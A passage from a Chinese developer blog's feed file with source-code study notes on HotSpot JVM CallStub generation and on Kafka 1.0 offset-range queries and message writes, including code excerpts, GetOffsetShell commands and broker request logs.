class="hljs-built_in">std</span>;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A</span> &#123;</span>  <span class="hljs-keyword">int</span> a;  <span class="hljs-keyword">int</span> b;&#125;;<span class="hljs-keyword">typedef</span> A* APtr;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  A a;  a.a=<span class="hljs-number">10</span>;  a.b=<span class="hljs-number">20</span>;  <span class="hljs-keyword">void</span> *q = (<span class="hljs-keyword">void</span>*)&amp;a;  APtr p = APtr(q); <span class="hljs-comment">// 指针转换</span>  <span class="hljs-built_in">cout</span>&lt;&lt;p-&gt;a&lt;&lt;<span class="hljs-string">","</span>&lt;&lt;p-&gt;b&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CallStub相关</title>
    <link href="/2020/04/22/hotspot-callstub/"/>
    <url>/2020/04/22/hotspot-callstub/</url>
    
    <content type="html"><![CDATA[<h2 id="CallStub相关"><a href="#CallStub相关" class="headerlink" title="CallStub相关"></a>CallStub相关</h2><h3 id="调用入口"><a href="#调用入口" class="headerlink" title="调用入口"></a>调用入口</h3><p>share/vm/runtime/stubRoutines.hpp  </p><pre><code class="hljs cpp"><span class="hljs-comment">// Calls to Java SimonNote: 函数指针结合typedef类型定义</span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*CallStub)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  address   link,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">intptr_t</span>* result,</span></span><span class="hljs-function"><span class="hljs-params">  BasicType result_type,</span></span><span class="hljs-function"><span class="hljs-params">  Method* method,</span></span><span class="hljs-function"><span class="hljs-params">  address   entry_point,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">intptr_t</span>* parameters,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">int</span>       size_of_parameters,</span></span><span class="hljs-function"><span class="hljs-params">  TRAPS</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-comment">// Calls to Java SimonNote: 将内存地址 转换成函数指针 CAST_TO_FN_PTR  ((CallStub)(castable_address(_call_stub_entry)))</span><span class="hljs-function"><span class="hljs-keyword">static</span> CallStub <span class="hljs-title">call_stub</span><span class="hljs-params">()</span>                              </span>&#123; <span class="hljs-keyword">return</span> CAST_TO_FN_PTR(CallStub, _call_stub_entry); &#125;</code></pre><p>CAST_TO_FN_PTR 宏转换成 ((CallStub)(castable_address(_call_stub_entry)))  </p><p>share/vm/runtime/javaCalls.cpp中调用call_stub部分  </p><pre><code class="hljs cpp">StubRoutines::call_stub()(  (address)&amp;link,  <span class="hljs-comment">// (intptr_t*)&amp;(result-&gt;_value), // see NOTE above (compiler problem)</span>  result_val_address,          <span class="hljs-comment">// see NOTE above (compiler problem)</span>  result_type,  method(),  entry_point,  args-&gt;parameters(),  args-&gt;size_of_parameters(),  CHECK);</code></pre><p>注意： call_stub 后面先接了一个()拿到函数指针后又接了一个括号含参数列表  </p><h3 id="入参"><a href="#入参" class="headerlink" title="入参"></a>入参</h3><p>8个入参及含义  </p><table><thead><tr><th>编号</th><th>参数名称</th><th>含义</th><th>压栈位置</th><th>call entry_point时的位置</th></tr></thead><tbody><tr><td>1</td><td>link</td><td>连接器 JavaCallWrapper类型，可以理解成调用上下文</td><td>2N(%ebp)</td><td>2N(%ebp)</td></tr><tr><td>2</td><td>result_val_address</td><td>函数返回值地址</td><td>3N(%ebp)</td><td>3N(%ebp)</td></tr><tr><td>3</td><td>result_type</td><td>函数返回类型</td><td>4N(%ebp)</td><td>4N(%ebp</td></tr><tr><td>4</td><td>method()</td><td>JVM内部所表示的JAVA方法对象</td><td>5N(%ebp)</td><td>ebx</td></tr><tr><td>5</td><td>entry_point</td><td>JVM调用JAVA方法例程入口。JVM内部的每一段例程是在启动时生成好。要调用JAVA方法，都需要经过本例程。然后才跳转到JAVA方法字节码所对应的机器指令去执行。</td><td>6N(%ebp)</td><td>eax</td></tr><tr><td>6</td><td>args-&gt;parameters()</td><td>JAVA方法入参集合</td><td>7N(%ebp)</td><td>edx</td></tr><tr><td>7</td><td>args-&gt;size_of_parameters()</td><td>JAVA方法入参数量</td><td>8N(%ebp)</td><td>ecx</td></tr><tr><td>8</td><td>CHECK</td><td>当前线程对象</td><td>9N(%ebp)</td><td>9N(%ebp)</td></tr></tbody></table><p>CHECK 宏展开 <strong>the_thread</strong>); if ((((ThreadShadow*)<strong>the_thread</strong>)-&gt;has_pending_exception())) return       ; (void)(0</p><p>JVM调用java程序main()主函数的路线图：<br>JVM主函数–&gt; 调用CallStub(_call_stub_entry例程)–&gt; 调用entry_point(entry_point例程)–&gt; 调用Java函数  </p><p>_call_stub_entry例程生成好了之后指向函数首地址，然后在调用时会将其强转成函数指针，这个函数就是<code>CallStub</code>。转就是CAST_TO_FN_PTR宏干的。</p><h3 id="call-stub-entry例程生成"><a href="#call-stub-entry例程生成" class="headerlink" title="_call_stub_entry例程生成"></a>_call_stub_entry例程生成</h3><p>cpu/x86/vm/stubGenerator_x86_64.cpp  </p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">generate_initial</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-comment">// Generates all stubs and initializes the entry points</span>  <span class="hljs-comment">// This platform-specific settings are needed by generate_call_stub()</span>  create_control_words();  <span class="hljs-comment">// entry points that exist in all platforms Note: This is code</span>  <span class="hljs-comment">// that could be shared among different platforms - however the</span>  <span class="hljs-comment">// benefit seems to be smaller than the disadvantage of having a</span>  <span class="hljs-comment">// much more complicated generator structure. See also comment in</span>  <span class="hljs-comment">// stubRoutines.hpp.</span>  StubRoutines::_forward_exception_entry = generate_forward_exception();  StubRoutines::_call_stub_entry =    generate_call_stub (StubRoutines::_call_stub_return_address);    ....</code></pre><p>generate_call_stub 所做的事情就是将<code>CallStub</code>的函数体直接以机器码的形式写入内存区域。很猛！<br>大概逻辑：  </p><ol><li>c++层面的参数入栈  </li><li>计算实际被调用的java方法的参数大小(这个是在编译期算出来的)算出需要的栈大小</li><li>计算 rdi rsi rbx mxcsr 四个寄存器所占用的栈空间大小</li><li>将上面计算出来的栈大小(在ecx寄存器中)拿出来完成栈空间分配，sub %ecx %esp。至此，JVM完成了动态栈分配。</li><li>调用者保存，因为是CallStub调用了java方法，那么java方法的调用者就是CallStub。现在需要保存调用者自己的寄存器数据。主要包括edi,esi,edx。在JVM中，esi存放java指令偏移地址，ebx存放java指令基地址。调用者保存实际是将刚才几个寄存器的值在栈中暂存。</li><li>参数压栈。是将java方法的参数入栈。采用循环迭代参数的方式。汇编层面用了跳转指令，有用到test je jne dec inc mov指令。java函数入参数量在ecx物理寄存器中。edx中存放的是parameters首地址。压完之后 栈帧中数据大概是 C++的CallStub的8个入参，eip ebp加上步骤3的4个寄存器共6个的暂存值，接着是java方法的入参。    </li><li>调用entry_point例程。entry_point也是函数指针。在调用entry_point例程之前，会生成一些机器码将CallStub一些入参放入寄存器，有：将method首地址放到ebx；将entry_point放到eax，将当前栈顶esp放到esi；放的方式都是基于一开始压栈的地址处理的。比如entry_point，mov 0x18(%ebp), %eax 。然后调用entry_point时，直接call ×%eax即可。为什么要将这些放入寄存器，因为调用entry_point时用的call指令，call指令会“切换新的栈帧”(是这么个意思)，所以之前的这些对象就不好基于栈再寻址了，就将其先放到寄存器里。另外没放的4个参数在entry_point例程中用不到。</li><li>获取entry_point的返回值。调用完之后 会将栈上的被调用者的返回值与返回类型mov到edi和esi两个寄存器中。调用放要用时就到这个寄存器中获取。</li></ol>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>offset range 查询</title>
    <link href="/2020/04/22/kafka1-0-offset-range-query/"/>
    <url>/2020/04/22/kafka1-0-offset-range-query/</url>
    
    <content type="html"><![CDATA[<h2 id="offset-range-查询"><a href="#offset-range-查询" class="headerlink" title="offset range 查询"></a>offset range 查询</h2><p>我们在实际使用过程中经常需要查询某个topic的某分区的offset的range<br>命令行：  </p><pre><code class="hljs shell">kafka-run-class.sh kafka.tools.GetOffsetShell --broker-list xxxx:9092 -topic xxxtopic --time -2      kafka-run-class.sh kafka.tools.GetOffsetShell --broker-list xxxx:9092 -topic xxxtopic --time -1</code></pre><p>-1 -2 的特殊含义：  </p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListOffsetRequest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractRequest</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> EARLIEST_TIMESTAMP = -<span class="hljs-number">2L</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> LATEST_TIMESTAMP = -<span class="hljs-number">1L</span>;&#125;</code></pre><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>KafkaConsumer.endOffsets(Collection<TopicPartition>)<br>KafkaConsumer.beginningOffsets(Collection<TopicPartition>)<br>Fetcher.beginningOrEndOffset(Collection<TopicPartition>, long, long)<br>Fetcher.retrieveOffsetsByTimes(Map&lt;TopicPartition, Long&gt;, long, boolean)<br>Fetcher.sendListOffsetRequests(boolean, Map&lt;TopicPartition, Long&gt;)  </p><pre><code class="hljs java"><span class="hljs-comment">// Group the partitions by node.</span>        <span class="hljs-keyword">final</span> Map&lt;Node, Map&lt;TopicPartition, Long&gt;&gt; timestampsToSearchByNode = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();        <span class="hljs-keyword">for</span> (Map.Entry&lt;TopicPartition, Long&gt; entry: timestampsToSearch.entrySet()) &#123;            TopicPartition tp  = entry.getKey();            PartitionInfo info = metadata.fetch().partition(tp);            <span class="hljs-keyword">if</span> (info == <span class="hljs-keyword">null</span>) &#123;                metadata.add(tp.topic());                log.debug(<span class="hljs-string">"Partition &#123;&#125; is unknown for fetching offset, wait for metadata refresh"</span>, tp);                <span class="hljs-keyword">return</span> RequestFuture.staleMetadata();            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (info.leader() == <span class="hljs-keyword">null</span>) &#123;                log.debug(<span class="hljs-string">"Leader for partition &#123;&#125; unavailable for fetching offset, wait for metadata refresh"</span>, tp);                <span class="hljs-keyword">return</span> RequestFuture.leaderNotAvailable();            &#125; <span class="hljs-keyword">else</span> &#123;                Node node = info.leader();                Map&lt;TopicPartition, Long&gt; topicData = timestampsToSearchByNode.get(node);                <span class="hljs-keyword">if</span> (topicData == <span class="hljs-keyword">null</span>) &#123;                    topicData = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();                    timestampsToSearchByNode.put(node, topicData);                &#125;                topicData.put(entry.getKey(), entry.getValue());            &#125;        &#125;        <span class="hljs-keyword">final</span> RequestFuture&lt;Map&lt;TopicPartition, OffsetData&gt;&gt; listOffsetRequestsFuture = <span class="hljs-keyword">new</span> RequestFuture&lt;&gt;();        <span class="hljs-keyword">final</span> Map&lt;TopicPartition, OffsetData&gt; fetchedTimestampOffsets = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();        <span class="hljs-keyword">final</span> AtomicInteger remainingResponses = <span class="hljs-keyword">new</span> AtomicInteger(timestampsToSearchByNode.size());        <span class="hljs-keyword">for</span> (Map.Entry&lt;Node, Map&lt;TopicPartition, Long&gt;&gt; entry : timestampsToSearchByNode.entrySet()) &#123;            sendListOffsetRequest(entry.getKey(), entry.getValue(), requireTimestamps)                    .addListener(<span class="hljs-keyword">new</span> RequestFutureListener&lt;Map&lt;TopicPartition, OffsetData&gt;&gt;() &#123;                        <span class="hljs-meta">@Override</span>                        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onSuccess</span><span class="hljs-params">(Map&lt;TopicPartition, OffsetData&gt; value)</span> </span>&#123;                            <span class="hljs-keyword">synchronized</span> (listOffsetRequestsFuture) &#123;                                fetchedTimestampOffsets.putAll(value);                                <span class="hljs-keyword">if</span> (remainingResponses.decrementAndGet() == <span class="hljs-number">0</span> &amp;&amp; !listOffsetRequestsFuture.isDone())                                    listOffsetRequestsFuture.complete(fetchedTimestampOffsets);                            &#125;                        &#125;                        <span class="hljs-meta">@Override</span>                        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onFailure</span><span class="hljs-params">(RuntimeException e)</span> </span>&#123;                            <span class="hljs-keyword">synchronized</span> (listOffsetRequestsFuture) &#123;                                <span class="hljs-comment">// This may cause all the requests to be retried, but should be rare.</span>                                <span class="hljs-keyword">if</span> (!listOffsetRequestsFuture.isDone())                                    listOffsetRequestsFuture.raise(e);                            &#125;                        &#125;                    &#125;);        &#125;        <span class="hljs-keyword">return</span> listOffsetRequestsFuture;</code></pre><p>简单点说：就是找到leader节点然后给其发送<code>ListOffsetRequest</code>请求。这个<a href="https://www.cnblogs.com/simoncook/p/11317367.html" target="_blank" rel="noopener">请求</a>是按时间进行offset定位。    </p><h3 id="broker端"><a href="#broker端" class="headerlink" title="broker端"></a>broker端</h3><p>KafkaApis.handleListOffsetRequestV1AndAbove(request: RequestChannel.Request)  </p><h4 id="查询最新offset"><a href="#查询最新offset" class="headerlink" title="查询最新offset"></a>查询最新offset</h4><p>这个值应该是在生产的时候维护好的  </p><pre><code class="hljs scala"><span class="hljs-keyword">val</span> lastFetchableOffset = offsetRequest.isolationLevel <span class="hljs-keyword">match</span> &#123;  <span class="hljs-keyword">case</span> <span class="hljs-type">IsolationLevel</span>.<span class="hljs-type">READ_COMMITTED</span> =&gt; localReplica.lastStableOffset.messageOffset  <span class="hljs-keyword">case</span> <span class="hljs-type">IsolationLevel</span>.<span class="hljs-type">READ_UNCOMMITTED</span> =&gt; localReplica.highWatermark.messageOffset&#125;</code></pre><p>这个地方也能反映出<span style="font-weight:bold;color:red;"> LEO，LSO，highwater的区别</span>！！  </p><h4 id="查询最早offset"><a href="#查询最早offset" class="headerlink" title="查询最早offset"></a>查询最早offset</h4><p>kafka.log.Log.fetchOffsetsByTimestamp(targetTimestamp: Long)<br>这个值应该是在生产的时候维护好的  </p><pre><code class="hljs scala"><span class="hljs-meta">@threadsafe</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log</span>(<span class="hljs-params">@volatile var dir: <span class="hljs-type">File</span>,</span></span><span class="hljs-class"><span class="hljs-params">          @volatile var config: <span class="hljs-type">LogConfig</span>,</span></span><span class="hljs-class"><span class="hljs-params">          @volatile var logStartOffset: <span class="hljs-type">Long</span>,</span></span><span class="hljs-class"><span class="hljs-params">          @volatile var recoveryPoint: <span class="hljs-type">Long</span>,</span></span><span class="hljs-class"><span class="hljs-params">          scheduler: <span class="hljs-type">Scheduler</span>,</span></span><span class="hljs-class"><span class="hljs-params">          brokerTopicStats: <span class="hljs-type">BrokerTopicStats</span>,</span></span><span class="hljs-class"><span class="hljs-params">          time: <span class="hljs-type">Time</span>,</span></span><span class="hljs-class"><span class="hljs-params">          val maxProducerIdExpirationMs: <span class="hljs-type">Int</span>,</span></span><span class="hljs-class"><span class="hljs-params">          val producerIdExpirationCheckIntervalMs: <span class="hljs-type">Int</span>,</span></span><span class="hljs-class"><span class="hljs-params">          val topicPartition: <span class="hljs-type">TopicPartition</span>,</span></span><span class="hljs-class"><span class="hljs-params">          val producerStateManager: <span class="hljs-type">ProducerStateManager</span>,</span></span><span class="hljs-class"><span class="hljs-params">          logDirFailureChannel: <span class="hljs-type">LogDirFailureChannel</span></span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">Logging</span> <span class="hljs-keyword">with</span> <span class="hljs-title">KafkaMetricsGroup</span> </span>&#123;<span class="hljs-comment">// ......</span><span class="hljs-keyword">if</span> (targetTimestamp == <span class="hljs-type">ListOffsetRequest</span>.<span class="hljs-type">EARLIEST_TIMESTAMP</span>)        <span class="hljs-keyword">return</span> <span class="hljs-type">Some</span>(<span class="hljs-type">TimestampOffset</span>(<span class="hljs-type">RecordBatch</span>.<span class="hljs-type">NO_TIMESTAMP</span>, logStartOffset))</code></pre><h4 id="按时间戳查询offset"><a href="#按时间戳查询offset" class="headerlink" title="按时间戳查询offset"></a>按时间戳查询offset</h4><p>先确定target segment</p><pre><code class="hljs scala"><span class="hljs-keyword">val</span> targetSeg = &#123;  <span class="hljs-comment">// Get all the segments whose largest timestamp is smaller than target timestamp</span>  <span class="hljs-keyword">val</span> earlierSegs = segmentsCopy.takeWhile(_.largestTimestamp &lt; targetTimestamp)  <span class="hljs-comment">// We need to search the first segment whose largest timestamp is greater than the target timestamp if there is one.</span>  <span class="hljs-keyword">if</span> (earlierSegs.length &lt; segmentsCopy.length)    <span class="hljs-type">Some</span>(segmentsCopy(earlierSegs.length))  <span class="hljs-keyword">else</span>    <span class="hljs-type">None</span>&#125;</code></pre><p>再到seg的index根据时间查找<br>LogSegment.findOffsetByTimestamp(timestamp: Long, startingOffset: Long)<br>先定位到index然后再二分查找</p><pre><code class="hljs scala"><span class="hljs-comment">// LogSegment.scala</span><span class="hljs-keyword">val</span> timestampOffset = timeIndex.lookup(timestamp)<span class="hljs-keyword">val</span> position = index.lookup(math.max(timestampOffset.offset, startingOffset)).position<span class="hljs-comment">// AbstractIndex.scala</span>  <span class="hljs-comment">/**</span><span class="hljs-comment">   * Lookup lower and upper bounds for the given target.</span><span class="hljs-comment">   */</span>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">indexSlotRangeFor</span></span>(idx: <span class="hljs-type">ByteBuffer</span>, target: <span class="hljs-type">Long</span>, searchEntity: <span class="hljs-type">IndexSearchEntity</span>): (<span class="hljs-type">Int</span>, <span class="hljs-type">Int</span>) = &#123;    <span class="hljs-comment">// check if the index is empty</span>    <span class="hljs-keyword">if</span>(_entries == <span class="hljs-number">0</span>)      <span class="hljs-keyword">return</span> (<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>)    <span class="hljs-comment">// check if the target offset is smaller than the least offset</span>    <span class="hljs-keyword">if</span>(compareIndexEntry(parseEntry(idx, <span class="hljs-number">0</span>), target, searchEntity) &gt; <span class="hljs-number">0</span>)      <span class="hljs-keyword">return</span> (<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>)    <span class="hljs-comment">// binary search for the entry</span>    <span class="hljs-keyword">var</span> lo = <span class="hljs-number">0</span>    <span class="hljs-keyword">var</span> hi = _entries - <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(lo &lt; hi) &#123;      <span class="hljs-keyword">val</span> mid = ceil(hi/<span class="hljs-number">2.0</span> + lo/<span class="hljs-number">2.0</span>).toInt      <span class="hljs-keyword">val</span> found = parseEntry(idx, mid)      <span class="hljs-keyword">val</span> compareResult = compareIndexEntry(found, target, searchEntity)      <span class="hljs-keyword">if</span>(compareResult &gt; <span class="hljs-number">0</span>)        hi = mid - <span class="hljs-number">1</span>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(compareResult &lt; <span class="hljs-number">0</span>)        lo = mid      <span class="hljs-keyword">else</span>        <span class="hljs-keyword">return</span> (mid, mid)    &#125;    (lo, <span class="hljs-keyword">if</span> (lo == _entries - <span class="hljs-number">1</span>) <span class="hljs-number">-1</span> <span class="hljs-keyword">else</span> lo + <span class="hljs-number">1</span>)  &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>消息写入</title>
    <link href="/2020/04/22/kafka1-0-message-write/"/>
    <url>/2020/04/22/kafka1-0-message-write/</url>
    
    <content type="html"><![CDATA[<h2 id="消息写入"><a href="#消息写入" class="headerlink" title="消息写入"></a>消息写入</h2><h3 id="生产消息时的rpc请求日志"><a href="#生产消息时的rpc请求日志" class="headerlink" title="生产消息时的rpc请求日志"></a>生产消息时的rpc请求日志</h3><p>leader节点  </p><pre><code class="hljs java">[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">266</span>] INFO Handling request:RequestHeader(apiKey=FETCH, apiVersion=<span class="hljs-number">5</span>, clientId=broker-<span class="hljs-number">0</span>-fetcher-<span class="hljs-number">0</span>, correlationId=<span class="hljs-number">8855</span>) -- &#123;replica_id=<span class="hljs-number">0</span>,max_wait_time=<span class="hljs-number">500</span>,min_bytes=<span class="hljs-number">1</span>,max_bytes=<span class="hljs-number">10485760</span>,isolation_level=<span class="hljs-number">0</span>,topics=[&#123;topic=test.vv19,partitions=[&#123;partition=<span class="hljs-number">0</span>,fetch_offset=<span class="hljs-number">35</span>,log_start_offset=<span class="hljs-number">0</span>,max_bytes=<span class="hljs-number">1048576</span>&#125;]&#125;]&#125; from connection <span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">49385</span>-<span class="hljs-number">0</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">266</span>] INFO testEnter0006-replica:<span class="hljs-number">0</span> newLogEndOffset:<span class="hljs-number">35</span> oldLogEndOffsetMetadata <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">267</span>] INFO testEnter0007-maybeIncrementLeaderHW:Set(<span class="hljs-number">35</span> [<span class="hljs-number">0</span> : <span class="hljs-number">2765</span>]) newHighWatermark:<span class="hljs-number">35</span> oldHighWatermark <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">610</span>] INFO Handling request:RequestHeader(apiKey=METADATA, apiVersion=<span class="hljs-number">5</span>, clientId=producer-<span class="hljs-number">1</span>, correlationId=<span class="hljs-number">34</span>) -- &#123;topics=[test.vv19],allow_auto_topic_creation=<span class="hljs-keyword">true</span>&#125; from connection <span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">60308</span>-<span class="hljs-number">1</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">769</span>] INFO Handling request:RequestHeader(apiKey=FETCH, apiVersion=<span class="hljs-number">5</span>, clientId=broker-<span class="hljs-number">0</span>-fetcher-<span class="hljs-number">0</span>, correlationId=<span class="hljs-number">8856</span>) -- &#123;replica_id=<span class="hljs-number">0</span>,max_wait_time=<span class="hljs-number">500</span>,min_bytes=<span class="hljs-number">1</span>,max_bytes=<span class="hljs-number">10485760</span>,isolation_level=<span class="hljs-number">0</span>,topics=[&#123;topic=test.vv19,partitions=[&#123;partition=<span class="hljs-number">0</span>,fetch_offset=<span class="hljs-number">35</span>,log_start_offset=<span class="hljs-number">0</span>,max_bytes=<span class="hljs-number">1048576</span>&#125;]&#125;]&#125; from connection ********************************<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">49385</span>-<span class="hljs-number">0</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">769</span>] INFO testEnter0006-replica:<span class="hljs-number">0</span> newLogEndOffset:<span class="hljs-number">35</span> oldLogEndOffsetMetadata <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">769</span>] INFO testEnter0007-maybeIncrementLeaderHW:Set(<span class="hljs-number">35</span> [<span class="hljs-number">0</span> : <span class="hljs-number">2765</span>]) newHighWatermark:<span class="hljs-number">35</span> oldHighWatermark <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">773</span>] INFO Handling request:RequestHeader(apiKey=PRODUCE, apiVersion=<span class="hljs-number">5</span>, clientId=producer-<span class="hljs-number">1</span>, correlationId=<span class="hljs-number">35</span>) -- &#123;acks=-<span class="hljs-number">1</span>,timeout=<span class="hljs-number">30000</span>,partitionSizes=[test.vv19-<span class="hljs-number">0</span>=<span class="hljs-number">79</span>]&#125; from connection <span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">60308</span>-<span class="hljs-number">1</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">834</span>] INFO Updated PartitionLeaderEpoch. New: &#123;epoch:<span class="hljs-number">27</span>, offset:<span class="hljs-number">35</span>&#125;, Current: &#123;epoch:<span class="hljs-number">25</span>, offset34&#125; <span class="hljs-keyword">for</span> Partition: test.vv19-<span class="hljs-number">0</span>. Cache now contains <span class="hljs-number">11</span> entries. (kafka.server.epoch.LeaderEpochFileCache)****************************************************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">313</span>] INFO testEnter0007-maybeIncrementLeaderHW:Set(<span class="hljs-number">35</span> [<span class="hljs-number">0</span> : <span class="hljs-number">2765</span>], <span class="hljs-number">36</span> [<span class="hljs-number">0</span> : <span class="hljs-number">2844</span>]) newHighWatermark:<span class="hljs-number">35</span> oldHighWatermark <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">400</span>] INFO Handling request:RequestHeader(apiKey=FETCH, apiVersion=<span class="hljs-number">5</span>, clientId=broker-<span class="hljs-number">0</span>-fetcher-<span class="hljs-number">0</span>, correlationId=<span class="hljs-number">8857</span>) -- &#123;replica_id=<span class="hljs-number">0</span>,max_wait_time=<span class="hljs-number">500</span>,min_bytes=<span class="hljs-number">1</span>,max_bytes=<span class="hljs-number">10485760</span>,isolation_level=<span class="hljs-number">0</span>,topics=[&#123;topic=test.vv19,partitions=[&#123;partition=<span class="hljs-number">0</span>,fetch_offset=<span class="hljs-number">36</span>,log_start_offset=<span class="hljs-number">0</span>,max_bytes=<span class="hljs-number">1048576</span>&#125;]&#125;]&#125; from connection <span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">49385</span>-<span class="hljs-number">0</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">400</span>] INFO testEnter0006-replica:<span class="hljs-number">0</span> newLogEndOffset:<span class="hljs-number">36</span> oldLogEndOffsetMetadata <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span 